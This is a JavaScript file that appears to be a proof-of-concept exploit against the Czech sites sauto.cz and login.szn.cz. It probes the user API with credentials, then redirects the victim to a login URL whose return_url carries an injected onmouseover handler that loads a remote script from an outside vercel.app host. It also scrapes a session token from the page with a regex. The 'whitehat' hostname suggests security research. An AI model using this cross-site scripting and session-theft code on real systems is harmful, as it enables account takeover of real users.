var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        console.log('yes');
        getCookiesFromResponse();
    } else if (this.readyState == 4 && this.status == 401) {
        const url = "https://login.szn.cz/continue?return_url=https%3A%2F%2Flogin.sauto.cz%2FloginDone%3Fservice%3Dsauto%26return_url%3Dhttps://www.sauto.cz%2fbannerova-reklama%253FperPage%253D1%2526banner%253D1%2526clickthru%253D";
        console.log('no');
        const suffix = "/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app//index.js%27);%20document.head.appendChild(s)";
        window.location.replace(url + suffix);
        console.log(url + suffix);
    }
};
xhttp.open("GET", "https://www.sauto.cz/api/v1/users/self", true);
xhttp.withCredentials = true;
xhttp.send();

function getCookiesFromResponse() {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            var response = this.responseText;
            var session = response.match(/(?<=ds=).{72}/)[0];
            console.log(session);
        }
    };
    xhttp2.open("GET", "https://www.sauto.cz", true);
    xhttp2.withCredentials = true;
    xhttp2.send();
}